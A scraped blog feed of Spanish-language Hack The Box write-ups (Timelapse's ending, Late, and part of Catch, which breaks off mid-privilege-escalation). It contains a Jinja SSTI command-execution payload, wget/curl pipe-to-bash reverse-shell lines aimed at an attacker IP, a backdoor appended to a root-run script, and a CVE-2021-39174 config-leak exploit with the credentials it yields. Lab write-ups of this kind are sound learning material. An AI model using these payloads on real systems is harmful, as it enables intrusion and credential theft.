7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 π ~/htb/timelapse/shares/cert ❯ ruby admin_shell.rb PS \u0026gt; whoami timelapse\\administrator PS \u0026gt; pwd Path ---- C:\\Users\\Administrator\\Documents PS \u0026gt; dir ..\\Desktop PS \u0026gt; dir ..\\..\\ Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 10/23/2021 11:27 AM Administrator d----- 10/25/2021 8:22 AM legacyy d-r--- 10/23/2021 11:27 AM Public d----- 10/25/2021 12:23 PM svc_deploy d----- 2/23/2022 5:45 PM TRX PS \u0026gt; cd ..\\..\\TRX\\Desktop PS \u0026gt; dir Directory: C:\\Users\\TRX\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/23/2022 12:12 AM 34 root.txt PS \u0026gt; type root.txt 3a2f63973573a40d5ae3185f8a110257 PS \u0026gt; ","description":"En Timelapse descubrimos un backup de WinRM, este contenia un certificado de autenticación de WinRM, mismo que nos permitió obtener acceso a un primer usuario. El historial de PowerShell nos permitió acceder a la contraseña de un segundo usuario. Finalmente observamos que el usuario pertenecia a un grupo relacionado a LAPS, lo cual nos permitió  obtener la contraseña de administrador. ","id":19,"section":"posts","tags":["kerbrute","crackmapexec","john","winrm","ruby","winpeas","LAPS","openssl"],"title":"Hack The Box - Timelapse","uri":"https://sckull.github.io/posts/timelapse/"},{"content":"\rUna aplicación escrita en Flask que permite convertir imagenes a texto donde identificamos una vulnerabilidad SSTI, tras la explotación logramos acceder a un primero usuario. Escalamos privilegios agregando una shell inversa a un archivo que se ejecuta cuando un usuario ingresa por SSH.\nNombre Late OS Linux Puntos 20 Dificultad Facil IP 10.10.11.156 Maker kavigihan\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.8, 3.9, 4.4, 5.6, 6.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 4, 9, 1, 6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Sat Apr 23 17:01:04 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.156 Nmap scan report for 10.10.11.156 (10.10.11.156) Host is up (0.27s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Late - Best online image tools |_http-server-header: nginx/1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr 23 17:01:26 2022 -- 1 IP address (1 host up) scanned in 22.01 seconds Web Site El sitio web muestra información indicando un editor de imagenes, observamos el dominio late.htb en el footer. También se muestran un link que nos lleva a la direccion images.late.htb, agregamos el dominio y subdominio al archivo /etc/hosts.\nEl subdominio muestra un formulario, donde explica que es posible convertir una imagen a un documento de texto, además se muestra que utiliza Flask.\nUser - svc_acc SSTI - Image to Text Tras enviar una imagen con texto el sitio nos devuelve un archivo donde vemos el texto que contiene la imagen.\nEscribimos un pequeño script para generar imagenes con texto. Utilizamos la fuente Lora y Roboto, ya que la fuente por default no siempre es interpretada por el sitio web y no muestra correctamente algunos caracteres enviados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from PIL import Image, ImageDraw, ImageFont import sys, requests if len(sys.argv) \u0026lt; 2: print(\u0026#34;[-] Usage: picture.py \u0026lt;text\u0026gt;.\u0026#34;) exit(1) text = sys.argv[1] width = 1012 height = 512 message = sys.argv[1] #font = ImageFont.truetype(\u0026#34;Lora-Regular.ttf\u0026#34;, size=20) font = ImageFont.truetype(\u0026#34;Roboto-Regular.ttf\u0026#34;, size=20) img = Image.new(\u0026#39;RGB\u0026#39;, (width, height), color=\u0026#39;blue\u0026#39;) imgDraw = ImageDraw.Draw(img) textWidth, textHeight = imgDraw.textsize(message, font=font) xText = (width - textWidth) / 2 yText = (height - textHeight) / 2 imgDraw.text((xText, yText), message, font=font, fill=(255, 255, 0)) img.save(\u0026#39;result.png\u0026#39;) url = \u0026#39;http://images.late.htb/scanner\u0026#39; files = {\u0026#39;file\u0026#39;: open(\u0026#39;result.png\u0026#39;, \u0026#39;rb\u0026#39;)} x = requests.post(url, files=files) print(x.text) Intentamos enviar {{7*7}} ya que el sitio indica que esta utilizando Flask, tras ello obtuvimos una respuesta 49, lo que indica una vulnerabilidad SSTI.\n1 2 3 4 π ~/htb/late ❯ python picture.py \u0026#34;{{ 7*7 }}\u0026#34; \u0026lt;p\u0026gt;49 \u0026lt;/p\u0026gt; π ~/htb/late ❯ Utilizamos un payload de SSTI con el cual logramos ejecutar comandos en la máquina.\n1 2 3 4 5 π ~/htb/late ❯ python picture.py \u0026#39;{{ joiner.__init__.__globals__.os.popen(\u0026#34; id \u0026#34;).read() }}\u0026#39; \u0026lt;p\u0026gt;uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc) \u0026lt;/p\u0026gt; π ~/htb/late ❯ Shell Utilizamos shells y con la ayuda de wget ejecutamos una shell inversa en la máquina.\n1 π ~/htb/late ❯ python picture.py \u0026#39;{{ joiner.__init__.__globals__.os.popen(\u0026#34;wget -qO- 10.10.14.207/10.10.14.207:1338 |bash\u0026#34;).read() }}\u0026#39; Tras ello logramos obtener acceso como svc_acc y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/late ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from late.htb [10.10.11.156] 54006 can\u0026#39;t access tty; job control turned off $ which python /usr/bin/python $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; svc_acc@late:~/app$ whoami;id;pwd svc_acc uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc) /home/svc_acc/app svc_acc@late:~/app$ cd svc_acc@late:~$ ls app user.txt svc_acc@late:~$ cat user.txt 2c2f9389101e3c42ef3c7bafef4fd735 svc_acc@late:~$ Utilizamos la clave privada SSH para una shell más comoda y estable.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/late ❯ ssh -i id_rsa_svc_acc svc_acc@late.htb The authenticity of host \u0026#39;late.htb (10.10.11.156)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:LsThZBhhwN3ctG27voIMK8bWCmPJkR4iDV9eb/adDOc. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;late.htb\u0026#39; (ED25519) to the list of known hosts. svc_acc@late:~$ ls app user.txt svc_acc@late:~$ cat user.txt 2c2f9389101e3c42ef3c7bafef4fd735 svc_acc@late:~$ Privesc Ejecutamos pspy, vemos algunos cronjobs siendo ejecutados, se realiza una copia del script ssh-alert.sh, luego le da el atributo de añadir (+a) utilizando chattr, además le da permisos al usuario svc_acc sobre el script. Tambien observamos que realiza una limpieza de carpetas en el directorio de la aplicación web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 2022/04/24 00:32:01 CMD: UID=0 PID=29595 | 2022/04/24 00:32:01 CMD: UID=0 PID=29594 | /bin/bash /root/scripts/cron.sh 2022/04/24 00:32:01 CMD: UID=0 PID=29593 | /bin/sh -c /root/scripts/cron.sh 2022/04/24 00:32:01 CMD: UID=0 PID=29592 | /usr/sbin/CRON -f 2022/04/24 00:32:01 CMD: UID=0 PID=29596 | rm /usr/local/sbin/ssh-alert.sh 2022/04/24 00:32:01 CMD: UID=0 PID=29597 | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 2022/04/24 00:32:01 CMD: UID=0 PID=29599 | 2022/04/24 00:32:01 CMD: UID=0 PID=29600 | rm -r /home/svc_acc/app/uploads/* 2022/04/24 00:32:01 CMD: UID=0 PID=29601 | rm -r /home/svc_acc/app/misc/* 2022/04/24 00:32:01 CMD: UID=0 PID=29602 | chattr +a /usr/local/sbin/ssh-alert.sh 2022/04/24 00:33:01 CMD: UID=0 PID=29605 | /bin/bash /root/scripts/cron.sh 2022/04/24 00:33:01 CMD: UID=0 PID=29604 | /bin/sh -c /root/scripts/cron.sh 2022/04/24 00:33:01 CMD: UID=0 PID=29603 | /usr/sbin/CRON -f 2022/04/24 00:33:01 CMD: UID=0 PID=29606 | chattr -a /usr/local/sbin/ssh-alert.sh 2022/04/24 00:33:01 CMD: UID=0 PID=29607 | /bin/bash /root/scripts/cron.sh 2022/04/24 00:33:01 CMD: UID=0 PID=29608 | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 2022/04/24 00:33:01 CMD: UID=0 PID=29610 | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh 2022/04/24 00:33:01 CMD: UID=0 PID=29611 | rm -r /home/svc_acc/app/uploads/* 2022/04/24 00:33:01 CMD: UID=0 PID=29612 | rm -r /home/svc_acc/app/misc/* El script ssh-alert.sh envia un correo con la información del usuario que ingresó por SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/bin/bash RECIPIENT=\u0026#34;root@late.htb\u0026#34; SUBJECT=\u0026#34;Email from Server Login: SSH Alert\u0026#34; BODY=\u0026#34; A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a` \u0026#34; if [ ${PAM_TYPE} = \u0026#34;open_session\u0026#34; ]; then echo \u0026#34;Subject:${SUBJECT} ${BODY}\u0026#34; | /usr/sbin/sendmail ${RECIPIENT} fi Vemos que tras ingresar por SSH el script es ejecutado.\n1 2 3 4 5 6 7 8 9 10 11 12 2022/04/24 01:09:01 CMD: UID=0 PID=30451 | 2022/04/24 01:09:49 CMD: UID=0 PID=30453 | /usr/sbin/sshd -D -R 2022/04/24 01:09:49 CMD: UID=110 PID=30454 | sshd: [net] 2022/04/24 01:09:52 CMD: UID=0 PID=30455 | /bin/bash /usr/local/sbin/ssh-alert.sh 2022/04/24 01:09:52 CMD: UID=0 PID=30456 | /bin/bash /usr/local/sbin/ssh-alert.sh 2022/04/24 01:09:52 CMD: UID=0 PID=30457 | uname -a 2022/04/24 01:09:52 CMD: UID=0 PID=30459 | /bin/bash /usr/local/sbin/ssh-alert.sh 2022/04/24 01:09:52 CMD: UID=0 PID=30458 | /bin/bash /usr/local/sbin/ssh-alert.sh 2022/04/24 01:09:52 CMD: UID=0 PID=30460 | sendmail: MTA: 23O19qba030460 localhost.localdomain [127.0.0.1]: DATA 2022/04/24 01:09:52 CMD: UID=0 PID=30461 | sendmail: MTA: ./23O19qba030460 from queue 2022/04/24 01:09:52 CMD: UID=1000 PID=30462 | sshd: svc_acc 2022/04/24 01:09:52 CMD: UID=0 PID=30463 | sensible-mda svc_acc@new root 127.0.0.1 Como sabemos tenemos permisos sobre el script, por lo que agregamos un comando para ejecutar una shell inversa.\n1 svc_acc@late:~$ echo \u0026#34;curl 10.10.14.207/10.10.14.207:1338|bash\u0026#34; \u0026gt;\u0026gt; /usr/local/sbin/ssh-alert.sh Ejecutamos netcat en el puerto especificado, ingresamos por SSH para que el script sea ejecutado, para finalmente obtener una shell como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/late ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from late.htb [10.10.11.156] 50754 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # whoami root # which python /usr/bin/python # python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@late:/# cd /root root@late:/root# ls root.txt scripts root@late:/root# cat root.txt 0ebb829b5c10a1c1b88f678b7e6525e3 root@late:/root# ","description":"Una aplicación escrita en Flask que permite convertir imagenes a texto donde identificamos una vulnerabilidad SSTI, tras la explotación logramos acceder a un primero usuario. Escalamos privilegios agregando una shell inversa a un archivo que se ejecuta cuando un usuario ingresa por SSH.","id":20,"section":"posts","tags":["ssti","python","pspy","flask"],"title":"Hack The Box - Late","uri":"https://sckull.github.io/posts/late/"},{"content":"\rCachet presenta un APK que contiene Tokens de autenticación lo que nos permitió acceder a Lets Chat, en este último encontramos credenciales. Una vulnerabilidad en Cachet permite filtrar las variables de configuración, tras la explotación obtuvimos nuevas credenciales y acceso por SSH. Finalmente escalamos privilegios realizando Command Injection en el nombre de una aplicación de un APK.\nNombre Catch OS Linux Puntos 30 Dificultad Media IP 10.10.11.150 Maker MrR3boot\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.3, 5.8, 5.3, 4.7, 4.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 10, 6, 4, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80, 3000, 5000, 8000) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 # Nmap 7.92 scan initiated Sat Mar 12 21:53:05 2022 as: nmap -p22,80,3000,5000,8000 -sV -sC -oN nmap_scan 10.10.11.150 Nmap scan report for 10.10.11.150 Host is up (0.23s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Catch Global Systems |_http-server-header: Apache/2.4.41 (Ubuntu) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: i_like_gitea=8da9befe09c1de50; Path=/; HttpOnly | Set-Cookie: _csrf=kkQpkmsvK4ttR_jHjOq9U9aeGZo6MTY0NzEzOTk5MTcwODg3MTU1NA; Path=/; Expires=Mon, 14 Mar 2022 02:53:11 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Sun, 13 Mar 2022 02:53:11 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en-US\u0026#34; class=\u0026#34;theme-\u0026#34;\u0026gt; | \u0026lt;head data-suburl=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt; Catch Repositories \u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Set-Cookie: i_like_gitea=6b2f273aca25d51f; Path=/; HttpOnly | Set-Cookie: _csrf=UPxe8n-XDdMZ0kAyBraVoF3m_YA6MTY0NzEzOTk5ODA1NTA1NDExNA; Path=/; Expires=Mon, 14 Mar 2022 02:53:18 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Sun, 13 Mar 2022 02:53:18 GMT |_ Content-Length: 0 5000/tcp open upnp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 302 Found | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Location: /login | Vary: Accept, Accept-Encoding | Content-Type: text/plain; charset=utf-8 | Content-Length: 28 | Set-Cookie: connect.sid=s%3AlNVpQL1WsY7o7wjMwLTDCWvDgGy06dF4.sc5L2Y3KLNYlCrY%2BgkIYKzqajxyPvTaXxCpDDc5HvpM; Path=/; HttpOnly | Date: Sun, 13 Mar 2022 02:53:16 GMT | Connection: close | Found. Redirecting to /login | HTTPOptions: | HTTP/1.1 200 OK | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Allow: GET,HEAD | Content-Type: text/html; charset=utf-8 | Content-Length: 8 | ETag: W/\u0026#34;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\u0026#34; | Set-Cookie: connect.sid=s%3AMUO7oTw60AcH91PKbLM2UBt3LYJ7Vh_E.MZzoCA%2BVW53txUUmyxM2Q1ROasfXVz8QDoD4hNj6FJw; Path=/; HttpOnly | Vary: Accept-Encoding | Date: Sun, 13 Mar 2022 02:53:19 GMT | Connection: close |_ GET,HEAD 8000/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Catch Global Systems |_http-server-header: Apache/2.4.29 (Ubuntu) 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : [.. snip ..] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 12 21:55:00 2022 -- 1 IP address (1 host up) scanned in 114.50 seconds Web Site Vemos que muestra un sitio estatico en el puerto 80, además expone un archivo .apk.\nGitea En el puerto 3000 encontramos Gitea en su versión 1.14.1, la versión vulnerable más cercana es 1.12.5.\nÚnicamente encontramos al usuario root y ningun repositorio público activo.\nLets Chat Por el puerto 5000 vemos un formulario para Lets Chat, tras investigar un poco encontramos el Repositorio de Github de esta aplicación, no presenta alguna vulnerabilidad hasta la fecha.\nCachet Finalmente en el puerto 8000 encontramos Cachet, un post expone distintas vulnerabilidades aunque es necesaria la autenticación para explotarlas.\nCatch App Anteriormente se mencinó un apk, utilizando jadx en su version gráfica, observamos en el MainActivity un WebView para el sitio web https://status.catch.htb, agregamos el dominio y subdominio al archivo /etc/hosts.\nTras explorar las strings del apk encontramos dos tokens: gitea y lets chat.\nTokens\r1 2 \u0026lt;string name=\u0026#34;gitea_token\u0026#34;\u0026gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;lets_chat_token\u0026#34;\u0026gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\u0026lt;/string\u0026gt; Al instalar y ejecutar esta aplicación, vemos que, unicamente realiza la visita del sitio https://status.catch.htb como se muestra en el MainActivity, sin embargo no obtuvimos una respuesta por parte de la máquina.\nGitea Utilizamos el token encontrado en la API \u0026ldquo;interactiva\u0026rdquo; de Gitea.\nTras enumerar los distintos usuarios e información de configuración, no encontramos suficiente información para acceder por Gitea.\nLets Chat Segun la Documentación de Lets Chat menciona que es posible utilizar un token como nombre de usuario para autenticación dejando en blanco la contraseña, sin embargo la applicación no lo permite.\nUtilizando las diferentes rutas descritas en la Documentación creamos un pequeño script para obtener la mayor información posible con el token encontrado.\nLets-Chat.py Inicialmente observamos los detalles de la cuenta del token, en este caso al usuario admin, vemos que existen tres salas y cuatro usuarios, observamos la conversación de cada sala, en una de estas encontramos credenciales aunque no menciona a que aplicación o servicio pertenece.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 π ~/htb/catch ❯ python3 lets-chat.py Account Details ┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ Detail ┃ Info. ┃ ┡━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ First Name │ Administrator │ │ Last Name │ NA │ │ Username │ admin │ │ Rooms │ Status, Employees, Android Development │ └────────────┴────────────────────────────────────────┘ Server Details ┏━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ Detail ┃ ┃ ┡━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ Rooms │ Status, Android Development, Employees │ │ Users │ admin, john, will, lucas │ │ Files │ │ └────────┴────────────────────────────────────────┘ ─────────────────────────────────────────────────────────────────────────── Rooms ─────────────────────────────────────────────────────────────────────────── ╭────────╮ ╭─────────────────────╮ ╭───────────╮ │ Status │ │ Android Development │ │ Employees │ ╰────────╯ ╰─────────────────────╯ ╰───────────╯ ─────────────────────────────────────────────────────────────────────── Room: Status ──────────────────────────────────────────────────────────────────────── john: ah sure! admin: You should actually include this task to your list as well as a part of quarterly audit john: Also make sure we\u0026#39;ve our systems, applications and databases up-to-date. admin: Excellent! john: Why not. We\u0026#39;ve this in our todo list for next quarter admin: @john is it possible to add SSL to our status domain to make sure everything is secure ? lucas: Here are the credentials `john : E}V!mywu_69T4C}W` lucas: Sure one sec. john: Can you create an account for me ? lucas: Hey Team! I\u0026#39;ll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ───────────────────────────────────────────────────────────────── Room: Android Development ───────────────────────────────────────────────────────────────── admin: Hey Team, Just heads up that we\u0026#39;re working on android app to alert our customers about status of the services. ────────────────────────────────────────────────────────────────────── Room: Employees ────────────────────────────────────────────────────────────────────── lucas: Thanks @admin admin: Please welcome our new IT Admin - Lucas, a crucial role that will help Catch’s revenue and will contribute to the overall profitability of the company! will: Thanks John! Glad to be part of the Catch john: Welcome Will! admin: Join me in welcoming our new employee Will Robinson who\u0026#39;s working as iOS Developer with John Team π ~/htb/catch ❯ Cachet - Configuration Leak Las credenciales encontradas nos permitieron el acceso al dashboard de Cachet.\nCVE-2021-39174 Anteriormente se mencionó un post con multiples vulnerabilidades en cachet.\nSe explica que es posible filtrar la configuración de Cachet del archivo .env utilizando ${} con el nombre de la variable declarada, es decir ${VARIABLE}, tal y como se muestra en el ejemplo de Nesting Variables. Además se menciona que al obtener el valor de APP_KEY nos puede permitir ejecutar comandos (RCE) aunque es necesario que el SESSION_DRIVER esté configurado con valor de cookie.\nIntentamos obtener el valor de las variables, encontramos que en Mail Address se muestran los valores, vemos el valor de APP_KEY.\nExploit Creamos un pequeño script para obtener la configuración de ciertas variables que tomamos de .env.example las cuales contienen credenciales, tomando en cuenta el formulario que se explica en el Anexo, además, nuestro script permite configurar las variables Redis para el CVE-2021-39172.\nCachet - CVE-2021-39174 \u0026amp; CVE-2021-39172 Tras ejecutar el script obtuvimos las credenciales de la base de datos.\n1 2 3 4 π ~/htb/catch ❯ ./cve.py -u john -p \u0026#39;E}V!mywu_69T4C}W\u0026#39; -url http://catch.htb:8000 [+] Enviando variables. [+] Valores Obtenidos: DB_U: will DB_P: s2#4Fg0_%3! MAIL_U: MAIL_P: User - Will Con las credenciales encontradas logramos acceder por SSH y a la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 π ~/htb/catch ❯ ssh will@catch.htb # s2#4Fg0_%3! will@catch.htb\u0026#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 20 Apr 2022 01:30:29 AM UTC System load: 0.12 Usage of /: 72.9% of 16.61GB Memory usage: 77% Swap usage: 60% Processes: 449 Users logged in: 0 IPv4 address for br-535b7cf3a728: 172.18.0.1 IPv4 address for br-fe1b5695b604: 172.19.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.150 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Apr 19 22:50:29 2022 from 10.10.14.207 will@catch:~$ pwd;whoami;id /home/will will uid=1000(will) gid=1000(will) groups=1000(will) will@catch:~$ ls user.txt will@catch:~$ cat user.txt b0d4a3d2c6c5b062b301b0796fe675c7 will@catch:~$ Privesc Tras la ejecución de pspy descubrimos un cronjob el cual ejecuta el script verify.sh.\n1 2 3 4 5 6 7 8 9 2022/04/20 01:34:01 CMD: UID=0 PID=380031 | /usr/sbin/CRON -f 2022/04/20 01:34:01 CMD: UID=0 PID=380030 | /usr/sbin/CRON -f 2022/04/20 01:34:01 CMD: UID=0 PID=380032 | /bin/sh -c rm -rf /root/mdm/certified_apps/* 2022/04/20 01:34:01 CMD: UID=0 PID=380034 | /bin/sh -c /opt/mdm/verify.sh 2022/04/20 01:34:01 CMD: UID=0 PID=380035 | /bin/bash /opt/mdm/verify.sh 2022/04/20 01:34:01 CMD: UID=??? PID=380038 | ??? 2022/04/20 01:34:01 CMD: UID=0 PID=380036 | 2022/04/20 01:34:01 CMD: UID=0 